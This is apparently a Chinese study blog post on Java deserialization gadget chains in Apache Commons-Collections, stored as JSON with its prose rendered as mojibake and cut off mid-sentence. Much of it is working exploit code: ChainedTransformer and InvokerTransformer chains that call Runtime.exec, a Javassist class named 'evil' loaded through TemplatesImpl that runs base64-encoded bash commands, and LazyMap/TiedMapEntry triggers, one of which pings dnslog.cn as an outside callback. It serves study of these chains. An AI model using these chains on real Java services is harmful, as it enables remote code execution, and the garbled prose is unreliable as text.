[{"title":"JAVAååºåˆ—åŒ–CCé“¾ç¬”è®°","url":"/2022/07/25/JAVAååºåˆ—åŒ–CC/","content":"\n# å‰ç½®è¯´æ˜\n\nä¾æ®è¿™å¼ å›¾æ¥è¿›è¡Œä¸€äº›åˆ†æ\n\nå‚è€ƒï¼š[Commons-Collections 1-7 åˆ©ç”¨é“¾åˆ†æ â€“ å¤©ä¸‹å¤§æœ¨å¤´ (wjlshare.com)](http://wjlshare.com/archives/1535)\n\n![DF8C7E9CED07CAD7321EFED262F23E20](https://pig-007.oss-cn-beijing.aliyuncs.com/img/DF8C7E9CED07CAD7321EFED262F23E20.png)\n\n# å‰ç½®çŸ¥è¯†\n\nCCé“¾åŒ…å«äº†å¥½å¤šçš„`Transformer`ï¼Œè¿™éƒ¨åˆ†çŸ¥è¯†åœ¨`P`ç¥çš„[JAVAå®‰å…¨æ¼«è°ˆ](https://github.com/phith0n/JavaThings)ä¸­è®²çš„æŒºæ¸…æ¥šçš„[Javaå®‰å…¨æ¼«è°ˆ - 09.ååºåˆ—åŒ–ç¯‡(3)](https://wx.zsxq.com/dweb2/index/topic_detail/548841448822424)ï¼Œç®€å•æä¸€ä¸‹\n\n## æºç -8u40\n\n## Transformer\n\n`Transformer`æ˜¯â¼€ä¸ªæ¥â¼ï¼Œä»£è¡¨è°ƒç”¨è¯¥å¯¹è±¡çš„`transform`æ–¹æ³•\n\n```java\npublic interface Transformer {\n    Object transform(Object input);\n}\n```\n\nå¾ˆå¤šçš„`transformer`ç³»åˆ—å¯¹è±¡éƒ½å®ç°äº†è¯¥æ¥å£ï¼Œå¹¶ä¸”è¿›è¡Œé‡å†™ï¼Œæ¯”å¦‚ç†Ÿæ‚‰çš„åƒ`InvokerTransformer`\n\n```java\npublic class InvokerTransformer implements Transformer, Serializable {\n    //....\n    public Object transform(Object input) {\n        if (input == null) {\n            return null;\n        } else {\n            try {\n                Class cls = input.getClass();\n                Method method = cls.getMethod(this.iMethodName, this.iParamTypes);\n                return method.invoke(input, this.iArgs);\n            }catch{\n                //...\n            }\n        }\n    }\n}\n```\n\n## TransformedMap\n\nå€Ÿç”¨ä¸€ä¸‹`p`ç¥åœ¨[JAVAå®‰å…¨æ¼«è°ˆ](https://github.com/phith0n/JavaThings)ä¸­çš„[Javaå®‰å…¨æ¼«è°ˆ - 09.ååºåˆ—åŒ–ç¯‡(3)](https://wx.zsxq.com/dweb2/index/topic_detail/548841448822424)ä¸‹çš„åŸè¯\n\n![image-20220802181051056](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220802181051056.png)\n\nè¿™é‡Œçš„**å›è°ƒ**æ„Ÿè§‰å°±æ˜¯è°ƒç”¨å¯¹åº”å®ç°äº†`Transformer`æ¥å£çš„ç±»çš„è‡ªå®šä¹‰çš„`transform`æ–¹æ³•ã€‚\n\nå…¶æºç å¦‚ä¸‹ï¼š\n\n```java\npublic class TransformedMap extends AbstractInputCheckedMapDecorator implements Serializable {\n    private static final long serialVersionUID = 7023152376788900464L;\n    protected final Transformer keyTransformer;\n    protected final Transformer valueTransformer;\n\n    public static Map decorate(Map map, Transformer keyTransformer, Transformer valueTransformer) {\n        return new TransformedMap(map, keyTransformer, valueTransformer);\n    }\n\n    protected TransformedMap(Map map, Transformer keyTransformer, Transformer valueTransformer) {\n        super(map);\n        this.keyTransformer = keyTransformer;\n        this.valueTransformer = valueTransformer;\n    }\n    //...\n}\n```\n\nç”±äºå…¶æ„é€ å‡½æ•°æ˜¯`protected`ä¿®é¥°çš„ï¼Œæ‰€ä»¥é€šå¸¸æ˜¯æ²¡åŠæ³•åœ¨æˆ‘ä»¬çš„ä»£ç ä¸­ç›´æ¥å®ä¾‹åŒ–å¯¹è±¡å‡ºæ¥çš„ï¼Œé‚£ä¹ˆå°±åˆ©ç”¨æä¾›çš„`decorate`å‡½æ•°æ¥å£å³å¯ã€‚\n\n## ConstantTransformer\n\nçœ‹æºç å°±çŸ¥é“\n\n```java\npublic class ConstantTransformer implements Transformer, Serializable {\n    static final long serialVersionUID = 6374440726369055124L;\n\t//....\n    private final Object iConstant;\n\n//....\n\n    public ConstantTransformer(Object constantToReturn) {\n        this.iConstant = constantToReturn;\n    }\n//...\n    public Object transform(Object input) {\n        return this.iConstant;\n    }\n//...\n}\n```\n\nå³æ„é€ å‡½æ•°çš„æ—¶å€™ä¼ å…¥â¼€ä¸ªå¯¹è±¡ï¼Œå½“è°ƒç”¨`transform`æ–¹æ³•æ—¶å†å°†è¿™ä¸ªå¯¹è±¡è¿”å›ï¼Œæœ€å¼€å§‹æˆ‘æƒ³ç€è¿™ä¸æ˜¯å¤šæ­¤ä¸€ä¸¾å—ï¼Œæœ‰ä»€ä¹ˆç”¨æã€‚åé¢æ‰çŸ¥é“ï¼Œè¿™å¯èƒ½å°±æ˜¯ä¸ºäº†ä¼ é€’æŸäº›æ— æ³•è¿›è¡Œåºåˆ—åŒ–çš„ç±»å§ï¼Œæ¯”å¦‚`Runtime`çš„ã€‚\n\n## InvokerTransformer\n\nè¿™ä¸ªå¯ä»¥è¯´æ˜¯å¾ˆå…³é”®çš„ä¸€ä¸ªç±»äº†ï¼Œèƒ½æ‰§è¡Œä»»æ„æ–¹æ³•ã€‚çœ‹ä¸‹æºç ï¼Œä¸»è¦å…³æ³¨ä¸‰ä¸ªå‚æ•°çš„æ„é€ å‡½æ•°å’Œ`transform`å‡½æ•°ã€‚\n\n```java\npublic class InvokerTransformer implements Transformer, Serializable {\n    static final long serialVersionUID = -8653385846894047688L;\n    private final String iMethodName;\n    private final Class[] iParamTypes;\n    private final Object[] iArgs;\n\n\t//....\n    public InvokerTransformer(String methodName, Class[] paramTypes, Object[] args) {\n        this.iMethodName = methodName;\n        this.iParamTypes = paramTypes;\n        this.iArgs = args;\n    }\n\t//.....\n    public Object transform(Object input) {\n        if (input == null) {\n            return null;\n        } else {\n            try {\n                Class cls = input.getClass();\n                Method method = cls.getMethod(this.iMethodName, this.iParamTypes);\n                return method.invoke(input, this.iArgs);\n            } catch{\n                //.....\n            }\n        }\n    }\n}\n\n```\n\nå³å½“è°ƒç”¨åˆ°è¯¥ç±»çš„`transform`å‡½æ•°æ—¶ï¼Œçº¦ç­‰äºæ‰§è¡Œ`input.iMethodName(this.iArgs)`ã€‚\n\n## ChainedTransformer\n\nåŒ…å«äº†ä¸€ä¸ª`Transformer`çš„æ•°ç»„ï¼Œå³æ•°ç»„ä¸­å‰â¼€ä¸ª`Transformer`çš„`transform`å‡½æ•°æ‰§è¡Œçš„è¿”å›ç»“æœï¼Œä½œä¸ºåâ¼€ä¸ª`Transformer`çš„`transform`å‡½æ•°çš„å‚æ•°è¾“å…¥\n\n```java\npublic class ChainedTransformer implements Transformer, Serializable {\n    static final long serialVersionUID = 3514945074733160196L;\n    private final Transformer[] iTransformers;\n\t//....\n\n    public ChainedTransformer(Transformer[] transformers) {\n        this.iTransformers = transformers;\n    }\n\n    public Object transform(Object object) {\n        for(int i = 0; i < this.iTransformers.length; ++i) {\n            object = this.iTransformers[i].transform(object);\n        }\n        return object;\n    }\n\t//...\n}\n\n```\n\næ¯”å¦‚å¦‚ä¸‹åœ¨ååºåˆ—åŒ–ä¸­å¸¸è§çš„æ‰§è¡Œ`Runtime.exec`çš„æ–¹æ³•\n\n```java\nChainedTransformer chain = new ChainedTransformer(new Transformer[] {\n    new ConstantTransformer(Runtime.class),\n    new InvokerTransformer(\"getMethod\", new Class[] {\n        String.class, Class[].class }, new Object[] {\n        \"getRuntime\", new Class[0] }),\n    new InvokerTransformer(\"invoke\", new Class[] {\n        Object.class, Object[].class }, new Object[] {null, new Object[0] }),\n    new InvokerTransformer(\"exec\", new Class[] {\n        String.class }, new Object[]{\"touch dddd\"})});\nchain.transform(123);//è¿™ä¸ª123æ²¡å•¥ç”¨,éšä¾¿è®¾ç½®\n```\n\né‚£ä¹ˆå®é™…çš„çš„è°ƒç”¨é“¾å¦‚ä¸‹ï¼Œå®é™…è°ƒè¯•ä¸€ä¸‹åº”è¯¥æ›´æ¸…æ¥šä¸€äº›ã€‚\n\n![æœªå‘½åç»˜å›¾](https://pig-007.oss-cn-beijing.aliyuncs.com/img/%E6%9C%AA%E5%91%BD%E5%90%8D%E7%BB%98%E5%9B%BE.png)\n\næ‰€ä»¥é€šå¸¸æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬å°±æ˜¯éœ€è¦æ‰¾åˆ°èƒ½è°ƒç”¨åˆ°æŸä¸ªå¯¹è±¡çš„`transform`å‡½æ•°çš„é“¾å­ã€‚\n\n## TemplatesImpl\n\nè¿™ä¸ªä¸çŸ¥é“è¢«è®¾è®¡å‡ºæ¥å¹²å•¥çš„ï¼Œä¸è¿‡åœ¨`JAVA`ååºåˆ—åŒ–ä¸­é€šå¸¸ç”¨æ¥åŠ è½½å­—èŠ‚ç ã€‚\n\n### å‰ç½®çŸ¥è¯†\n\nå‚è€ƒï¼š[Javaå®‰å…¨æ¼«è°ˆ - 13.Javaä¸­åŠ¨æ€åŠ è½½å­—èŠ‚ç çš„é‚£äº›æ–¹æ³•](https://wx.zsxq.com/dweb2/index/topic_detail/815544582812412)\n\n`JAVA`è™šæ‹Ÿæœº`JVM`å®é™…åŠ è½½è¿è¡Œçš„æ˜¯`.class`æ–‡ä»¶ï¼Œè€Œè¿™ä¸ª`.class`æ–‡ä»¶ï¼Œé‡Œé¢çš„å®é™…æ•°æ®å°±æ˜¯å­—èŠ‚ç ã€‚é‚£ä¹ˆå¦‚æœæˆ‘ä»¬å¯ä»¥è‡ªå®šä¹‰ä¸€ä¸ªç±»ï¼Œå…¶æ„é€ å‡½æ•°ä¸ºæ‰“å°`Hello World`ï¼Œç„¶åå°†ä¹‹ç¼–è¯‘æˆ`.class`æ–‡ä»¶ï¼Œç„¶åè®©`JAVA`å»åŠ è½½ï¼Œå°±å¯ä»¥è§¦å‘è¯¥ç±»çš„æ„é€ å‡½æ•°äº†ã€‚\n\né‚£ä¹ˆè¿™ä¸ªåŠ è½½`.class`æ–‡ä»¶çš„æ–¹æ³•ï¼Œå°±æ˜¯`defineClass`ï¼Œä»¥ä¸‹å°±æ˜¯pç¥æä¾›çš„ä¸€ä¸ªä¾‹å­ï¼Œè¿è¡Œä¼šæ‰“å°å‡º`Hello World`ã€‚\n\n```java\npackage test;\n\nimport java.lang.reflect.Method;\nimport java.util.Base64;\npublic class test {\n    public static void main(String[] args) throws Exception {\n        Method defineClass = ClassLoader.class.getDeclaredMethod(\"defineClass\", String.class,byte[].class, int.class, int.class);\n        defineClass.setAccessible(true);\n        byte[] code = Base64.getDecoder().decode(\"yv66vgAAADQAGwoABgANCQAOAA8IABAKABEAEgcAEwcAFAEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApTb3VyY2VGaWxlAQAKSGVsbG8uamF2YQwABwAIBwAVDAAWABcBAAtIZWxsbyBXb3JsZAcAGAwAGQAaAQAFSGVsbG8BABBqYXZhL2xhbmcvT2JqZWN0AQAQamF2YS9sYW5nL1N5c3RlbQEAA291dAEAFUxqYXZhL2lvL1ByaW50U3RyZWFtOwEAE2phdmEvaW8vUHJpbnRTdHJlYW0BAAdwcmludGxuAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWACEABQAGAAAAAAABAAEABwAIAAEACQAAAC0AAgABAAAADSq3AAGyAAISA7YABLEAAAABAAoAAAAOAAMAAAACAAQABAAMAAUAAQALAAAAAgAM\");\n        Class hello = (Class)defineClass.invoke(ClassLoader.getSystemClassLoader(), \"Hello\", code, 0, code.length);\n        hello.newInstance();\n    }\n}\n\n```\n\né‚£ä¹ˆæˆ‘ä»¬éœ€è¦å¯»æ‰¾çš„é“¾å­ï¼Œå°±æ˜¯èƒ½å¤Ÿè°ƒç”¨åˆ°`defineClass`æ–¹æ³•çš„é“¾å­ï¼Œè¿™é‡Œå°±æ˜¯`TemplatesImpl`ï¼Œå…¶è°ƒç”¨é“¾å¦‚ä¸‹ï¼š\n\n```\nTemplatesImpl.newTransformer() ->TemplatesImpl.getTransletInstance() -> TemplatesImpl.defineTransletClasses()-> TransletClassLoader.defineClass()\n```\n\nç›¸å…³å®é™…è°ƒç”¨æˆªå›¾å¦‚ä¸‹\n\n### é“¾å­\n\n#### TemplatesImpl.newTransformer()\n\n![image-20220803171708570](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220803171708570.png)\n\n#### TemplatesImpl.defineTransletClasses()\n\n![image-20220803171741367](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220803171741367.png)\n\n#### TransletClassLoader.defineClass()\n\nè¿™é‡Œçš„`_bytecodes[i]`å³ä¸º`TemplatesImpl`ç±»ä¸­ç§æœ‰æˆå‘˜ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡åå°„æ¥ä¸ºå…¶èµ‹å€¼ã€‚\n\n![image-20220803171936516](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220803171936516.png)\n\n\n\n## TrAXFilter\n\nè¯¥ç±»æœªå®ç°`Serializable`æ¥å£ï¼Œæ— æ³•è¿›è¡Œåºåˆ—åŒ–ï¼Œæ‰€ä»¥ä½¿ç”¨çš„æ—¶å€™é€šå¸¸ç»“åˆ`ConstantTransformer`æ¥æ­é…ä½¿ç”¨ã€‚ä¸»è¦å…³æ³¨å…¶æ„é€ å‡½æ•°\n\n```java\npublic class TrAXFilter extends XMLFilterImpl {\n    //....\n    private TransformerImpl        _transformer;\n    //.....\n\n    public TrAXFilter(Templates templates)  throws\n        TransformerConfigurationException\n    {\n        //...\n        _transformer = (TransformerImpl) templates.newTransformer();\n        //...\n    }\n    //....\n}\n```\n\nå³ä¼šä¾æ®ä¼ å…¥çš„`Templates`ç±»å¯¹è±¡ï¼Œæ¥è°ƒç”¨å…¶`newTransformer`å‡½æ•°ï¼Œè¿™ä¸ªæ˜¯ä¸æ˜¯å°±æ˜¯å¯ä»¥è°ƒç”¨åˆ°ä¹‹å‰æåˆ°çš„`TransformerImpl.newTransformer()`ä»è€ŒåŠ è½½å­—èŠ‚ç å‘¢ã€‚\n\n## InstantiateTransformer\n\nåŒæ ·ä¹Ÿæ˜¯ä¸€ä¸ªå®ç°äº†`Transformer`æ¥å£çš„ç±»ï¼Œä¸»è¦å…³æ³¨å…¶æ„é€ å‡½æ•°å’Œé‡å†™çš„`transform`å‡½æ•°\n\n```java\npublic class InstantiateTransformer implements Transformer, Serializable {\n    //......\n    private final Class[] iParamTypes;\n    private final Object[] iArgs;\n\n    private InstantiateTransformer() {\n        this.iParamTypes = null;\n        this.iArgs = null;\n    }\n\n    public InstantiateTransformer(Class[] paramTypes, Object[] args) {\n        this.iParamTypes = paramTypes;\n        this.iArgs = args;\n    }\n\n    public Object transform(Object input) {\n        try {\n            if (!(input instanceof Class)) {\n                throw new FunctorException(\"InstantiateTransformer: Input object was not an instanceof Class, it was a \" + (input == null ? \"null object\" : input.getClass().getName()));\n            } else {\n                Constructor con = ((Class)input).getConstructor(this.iParamTypes);\n                return con.newInstance(this.iArgs);\n            }\n        } catch (NoSuchMethodException var6) {\n            //...\n        }\n        //...\n    }\n}\n\n```\n\nå¯ä»¥çœ‹åˆ°æœ‰ä¸¤ä¸ªæ„é€ å‡½æ•°ï¼Œå½“ä¼ å…¥æœ‰å‚æ„é€ å‡½æ•°æ—¶ï¼Œå…¶æˆå‘˜`iParamTypes`å’Œ`iArgs`ä¼šè¢«èµ‹å€¼ï¼Œç„¶ååœ¨å…¶`transform`å‡½æ•°ä¸­ï¼Œä¼šä¾æ®æˆå‘˜`iParamTypes`å’Œ`iArgs`æ¥ç”Ÿæˆå®ä¾‹åŒ–å¯¹è±¡ã€‚\n\n```java\nConstructor con = ((Class)input).getConstructor(this.iParamTypes);\nreturn con.newInstance(this.iArgs);\n```\n\né‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥å€ŸåŠ©è¯¥ç±»çš„`transform`å‡½æ•°ï¼Œæ¥ç”Ÿæˆ`TrAXFilter`ç±»çš„å®ä¾‹åŒ–å¯¹è±¡ï¼Œä»è€Œåœ¨`TrAXFilter`çš„æ„é€ å‡½æ•°ä¸­ï¼Œè°ƒç”¨åˆ°`TemplatesImpl.newTransformer()`æ¥åŠ è½½å­—èŠ‚ç ï¼Œå®Œæˆä»»æ„å‡½æ•°è°ƒç”¨ã€‚\n\n\n\n# ç»å…¸é“¾å­CCI\n\n`ChainedTransformer->ConstantTransformer->InvokerTransformer`\n\nä¸ºäº†æ–¹ä¾¿ï¼Œè‡ªå·±å‘½åä¸º`CCI`\n\n## å‰ç½®çŸ¥è¯†\n\nå¯ä»¥ä½¿ç”¨`ChainedTransformer.transform()`æ¥è°ƒç”¨å…¶ä¸­è¯¥æ•°ç»„ä¸­çš„å„ç§`transformer`ï¼Œä»è€Œè·å–`Runtime`æ¥æ‰§è¡Œå‘½ä»¤ã€‚ä¸¾ä¸ªç®€å•çš„ä¾‹å­å¦‚ä¸‹\n\n```java\nimport java.lang.reflect.Field;\n\nimport org.apache.commons.collections.Transformer;\nimport org.apache.commons.collections.functors.ChainedTransformer;\nimport org.apache.commons.collections.functors.ConstantTransformer;\nimport org.apache.commons.collections.functors.InvokerTransformer;\n\npublic class test {\n    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {\n        Field field = obj.getClass().getDeclaredField(fieldName);\n        field.setAccessible(true);\n        field.set(obj, value);\n    }\n\n    public static void main(String[] args) throws Exception {\n        ChainedTransformer chain = new ChainedTransformer(new Transformer[] {\n            new ConstantTransformer(Runtime.class),\n            new InvokerTransformer(\"getMethod\", new Class[] {\n                String.class, Class[].class }, new Object[] {\n                \"getRuntime\", new Class[0] }),\n            new InvokerTransformer(\"invoke\", new Class[] {\n                Object.class, Object[].class }, new Object[] {null, new Object[0] }),\n            new InvokerTransformer(\"exec\", new Class[] {\n                String.class }, new Object[]{\"touch abc\"})});\n        chain.transform(\"aaa\");//éšä¾¿è®¾ç½®\n    }\n}\n```\n\nè°ƒç”¨æ—¶`ChainedTransformer.transfor()`æ»¡è¶³å¦‚ä¸‹æ¡ä»¶å³å¯\n\n![image-20220802121441271](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220802121441271.png)\n\nè¿›å…¥ä¹‹åä¼šä¸€ç›´å¾ªç¯è°ƒç”¨\n\n![image-20220802121635026](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220802121635026.png)\n\nç›´åˆ°æœ€åè°ƒç”¨åˆ°`Runtimeçš„exec`\n\n![image-20220802122031069](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220802122031069.png)\n\n## å®é™…ä½¿ç”¨\n\nè°ƒç”¨`transform`æ•°ç»„è·å–`runtime`\n\n```java\nChainedTransformer chain = new ChainedTransformer(new Transformer[] {\n    new ConstantTransformer(Runtime.class),\n    new InvokerTransformer(\"getMethod\", new Class[] {\n        String.class, Class[].class }, new Object[] {\n        \"getRuntime\", new Class[0] }),\n    new InvokerTransformer(\"invoke\", new Class[] {\n        Object.class, Object[].class }, new Object[] {null, new Object[0] }),\n    new InvokerTransformer(\"exec\", new Class[] {\n        String.class }, new Object[]{\"ping dnslog.cn\"})});\n\n//å…¶ä¸­ä¸€ç§è§¦å‘æ–¹å¼,LazyMap.get()\nHashMap innermap = new HashMap();\nLazyMap map = (LazyMap)LazyMap.decorate(innermap,chain);\n//è°ƒç”¨LazyMap.getæ–¹æ³•\nTiedMapEntry tiedmap = new TiedMapEntry(map,123);\n```\n\nä»£è¡¨å¦‚ä¸‹è·å–`Runtime`çš„é“¾å­\n\n![image-20220801101348788](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220801101348788.png)\n\nä»`LazyMap.get()`å¼€å§‹\n\n![image-20220801110714702](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220801110714702.png)\n\nè¿™é‡Œçš„`factory`ä¸º`ChainedTransformer`ï¼Œå…¶`transform`ä¸ºä¸€ä¸ªæ•°ç»„\n\n![image-20220802095635405](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220802095635405.png)\n\n`key`ä¸º`123`å¯ä»¥éšä¾¿è®¾ç½®ï¼Œä½†æ˜¯å®é™…è°ƒè¯•çš„æ—¶å€™ä¸çŸ¥é“ä¸ºä»€ä¹ˆè¿›ä¸å»ï¼Œåº”è¯¥æ˜¯`p`ç¥è®²çš„\n\n![image-20220802100443587](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220802100443587.png)\n\næ‰€ä»¥å¯¼è‡´è¿è¡Œåˆ°ä¸Šè¿°æƒ…å†µæ—¶ï¼Œä¸Šå±‚çš„`HashMap`ä¸­çš„keyå·²ç»æ˜¯ä¸€ä¸ªè¿›ç¨‹äº†ï¼Œæ‰€ä»¥æœ‰å€¼äº†ï¼Œå¯¼è‡´è°ƒè¯•æ— æ³•è¿›å…¥ã€‚\n\n![image-20220802100604384](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220802100604384.png)\n\n\n\n\n\n# ç»å…¸é“¾å­ITN\n\n`InvokerTransformer->TemplatesImpl.newTransformer`\n\nåŒæ ·ä¸ºäº†æ–¹ä¾¿è‡ªå·±å‘½åä¸º`ITN`\n\n## å‰ç½®çŸ¥è¯†\n\nå¯ä½¿ç”¨`TemplatesImpl.newTransformer`æ¥è°ƒç”¨åˆ°`defineClass`åŠ è½½å­—èŠ‚ç ä»»æ„è°ƒç”¨ï¼Œç»™ä¸ªç®€å•çš„ä¾‹å­\n\nå¤šæ–¹å‚è€ƒï¼š\n\n[åˆ©ç”¨TemplatesImplåŠ è½½å­—èŠ‚ç  - (yang99.top)](http://www.yang99.top/index.php/archives/63/)\n\n[JavaDeserializeLabå­¦ä¹ ï¼ˆjdk1.8.0_301ï¼‰ â€“ maxzed](https://maxzed.top/2022/07/13/javadeserializelabå­¦ä¹ ï¼ˆjdk1-8-0_301ï¼‰/)\n\n```java\npackage test;\n\nimport java.lang.reflect.Field;\nimport java.lang.reflect.InvocationHandler;\nimport java.lang.reflect.Method;\nimport java.lang.reflect.Proxy;\nimport java.util.Base64;\nimport java.util.HashMap;\nimport java.util.Map;\n\nimport com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;\nimport com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;\nimport com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;\nimport javassist.ClassPool;\nimport javassist.CtClass;\n\npublic class test {\n    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {\n        Field field = obj.getClass().getDeclaredField(fieldName);\n        field.setAccessible(true);\n        field.set(obj, value);\n    }\n\n    public static void main(String[] args) throws Exception {\n        ClassPool pool = ClassPool.getDefault();\n        pool.insertClassPath(String.valueOf(AbstractTranslet.class));\n        CtClass ctClass = pool.get(test.class.getName());//æ–°å»ºä¸€ä¸ªtestç±»ï¼Œæ²¡å•¥ç”¨\n        ctClass.setSuperclass(pool.get(AbstractTranslet.class.getName()));\n        String code = \"{java.lang.Runtime.getRuntime().exec(\\\"bash -c {echo,dG91Y2ggYWJj}|{base64,-d}|{bash,-i}\\\");}\";\n        ctClass.makeClassInitializer().insertAfter(code);\n        ctClass.setName(\"evil\");\n        byte[] bytes = ctClass.toBytecode();\n\n        TemplatesImpl obj = new TemplatesImpl();\n        setFieldValue(obj, \"_bytecodes\", new byte[][] {bytes});\n        setFieldValue(obj, \"_name\", \"HelloTemplatesImpl\");\n        setFieldValue(obj, \"_tfactory\", new TransformerFactoryImpl());\n        obj.newTransformer();\n    }\n}\n```\n\nè®¾ç½®çš„å‘½ä»¤ä¸º`touch abc`ã€‚\n\nè°ƒè¯•å¦‚ä¸‹ï¼Œå¯ä»¥çœ‹åˆ°ï¼Œæ»¡è¶³`TemplatesImpl.newTransformer`è°ƒç”¨æ—¶ï¼Œå­˜åœ¨`_name`ï¼Œå³å¯è°ƒç”¨å¯¹åº”çš„`_bytecodes`çš„å­—èŠ‚ç ã€‚\n\n![image-20220802113412874](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220802113412874.png)\n\n## å®é™…ä½¿ç”¨\n\n### JAVAç‰ˆæœ¬é™åˆ¶\n\nå‚è€ƒï¼š[BCEL ClassLoaderå»å“ªäº† | ç¦»åˆ«æ­Œ (leavesongs.com)](https://www.leavesongs.com/PENETRATION/where-is-bcel-classloader.html)\n\nä¹Ÿå°±æ˜¯`Java 8u251`ä»¥åï¼Œ`JAVA`é‡Œçš„`ClassLoader`è¢«åˆ é™¤ï¼Œä½†æ˜¯å®˜ç½‘çš„`JDK`é‡Œè¿˜æ˜¯æœ‰çš„ï¼Œæ‰€ä»¥è·‘ä¸Šé¢çš„ä¾‹å­ä»£ç è¿˜æ˜¯èƒ½è·‘é€šï¼Œä½†æ˜¯å¦‚æœå®é™…ç¯å¢ƒä¸­å¯èƒ½å°±ä¸è¡Œäº†ï¼Œè¿™ä¸ªä¸æ˜¯å¾ˆæ‡‚ã€‚\n\né‚£ä¹ˆå¦‚æœæ²¡æœ‰`ClassLoader`çš„è¯ï¼Œä¹Ÿå°±ä¸å­˜åœ¨ä¸‹é¢çš„åŠ è½½å­—èŠ‚ç çš„æ–¹æ³•äº†ï¼Œå…·ä½“åŸå› æ˜¯`newTransformer`å‡½æ•°å†…éƒ¨ä¼šè°ƒç”¨åˆ°`ClassLoader`æ¥åŠ è½½å­—èŠ‚ç ï¼Œè¿™ä¸ªå¯ä»¥å‚è€ƒå¦‚ä¸‹ï¼š[åˆ©ç”¨TemplatesImplåŠ è½½å­—èŠ‚ç  - (yang99.top)](http://www.yang99.top/index.php/archives/63/)\n\n### è§£æ\n\nè¯¥é“¾å­çš„ä½¿ç”¨æ–¹æ³•å‚è€ƒæˆ‘ç†Šå“¥çš„åšå®¢ï¼š[JavaDeserializeLabå­¦ä¹ ï¼ˆjdk1.8.0_301ï¼‰ â€“ maxzed](https://maxzed.top/2022/07/13/javadeserializelabå­¦ä¹ ï¼ˆjdk1-8-0_301ï¼‰/)\n\nåŠ è½½å­—èŠ‚ç ï¼Œç›´æ¥è¿è¡Œæ‰€éœ€å‘½ä»¤\n\n```java\nClassPool pool = ClassPool.getDefault();\npool.insertClassPath(String.valueOf(AbstractTranslet.class));\nCtClass ctClass = pool.get(test.class.getName());//æ–°å»ºä¸€ä¸ªtestç±»ï¼Œæ²¡å•¥ç”¨\nctClass.setSuperclass(pool.get(AbstractTranslet.class.getName()));\nString code = \"{java.lang.Runtime.getRuntime().exec(\\\"bash -c {echo,Li90ZXN0LnNo}|{base64,-d}|{bash,-i}\\\");}\";\nctClass.makeClassInitializer().insertAfter(code);\nctClass.setName(\"evil\");\n\nbyte[] bytes = ctClass.toBytecode();\nTemplatesImpl tempIm = new TemplatesImpl();\nsetField(tempIm, \"_name\", \"asd\");\nsetField(tempIm, \"_bytecodes\", new byte[][]{bytes});\nsetField(tempIm, \"_tfactory\", new TransformerFactoryImpl());\nInvokerTransformer invTransf = new InvokerTransformer(\"newTransformer\", null, null);\n\nHashMap innermap = new HashMap();\n\nLazyMap map = (LazyMap)LazyMap.decorate(innermap,invTransf);\n//è°ƒç”¨Getæ–¹æ³•\nTiedMapEntry tiedmap = new TiedMapEntry(map,tempIm);\n```\n\nä»£è¡¨å¦‚ä¸‹è¿è¡Œå­—èŠ‚ç é“¾å­\n\n![image-20220802103631920](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220802103631920.png)\n\nä¹Ÿæ˜¯ä»`LazyMap.get()`å¼€å§‹ï¼Œè¿™é‡Œè°ƒè¯•æ—¶ä¸Šä¸€å±‚`HashMap`ä¸­å°±æ²¡æœ‰`key`å€¼äº†ï¼Œæ‰€ä»¥å¯ä»¥è¿›å»\n\n![image-20220802105100090](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220802105100090.png)\n\nç„¶åè¿›å…¥`transform`ä¸­ï¼Œå¯ä»¥çœ‹åˆ°å¯¹åº”çš„è¦æ‰§è¡Œçš„å‘½ä»¤å­—èŠ‚ç \n\n![image-20220802105822797](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220802105822797.png)\n\n```\n[-54, -2, -70, -66, 0, 0, 0, 52, 0, 35, 10, 0, 3, 0, 13, 7, 0, 33, 7, 0, 15, 1, 0, 6, 60, 105, 110, 105, 116, 62, 1, 0, 3, 40, 41, 86, 1, 0, 4, 67, 111, 100, 101, 1, 0, 15, 76, 105, 110, 101, 78, 117, 109, 98, 101, 114, 84, 97, 98, 108, 101, 1, 0, 18, 76, 111, 99, 97, 108, 86, 97, 114, 105, 97, 98, 108, 101, 84, 97, 98, 108, 101, 1, 0, 4, 116, 104, 105, 115, 1, 0, 11, 76, 116, 101, 115, 116, 47, 116, 101, +499 more]\n```\n\nå¯¹æ¯”ä¸€ä¸‹åœ¨æ²¡æœ‰åºåˆ—åŒ–æ—¶çš„æ•°æ®\n\n![image-20220802105946768](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220802105946768.png)\n\n```\n[-54, -2, -70, -66, 0, 0, 0, 52, 0, 35, 10, 0, 3, 0, 13, 7, 0, 33, 7, 0, 15, 1, 0, 6, 60, 105, 110, 105, 116, 62, 1, 0, 3, 40, 41, 86, 1, 0, 4, 67, 111, 100, 101, 1, 0, 15, 76, 105, 110, 101, 78, 117, 109, 98, 101, 114, 84, 97, 98, 108, 101, 1, 0, 18, 76, 111, 99, 97, 108, 86, 97, 114, 105, 97, 98, 108, 101, 84, 97, 98, 108, 101, 1, 0, 4, 116, 104, 105, 115, 1, 0, 11, 76, 116, 101, 115, 116, 47, 116, 101, +499 more]\n```\n\næ˜¯å®Œå…¨ä¸€æ 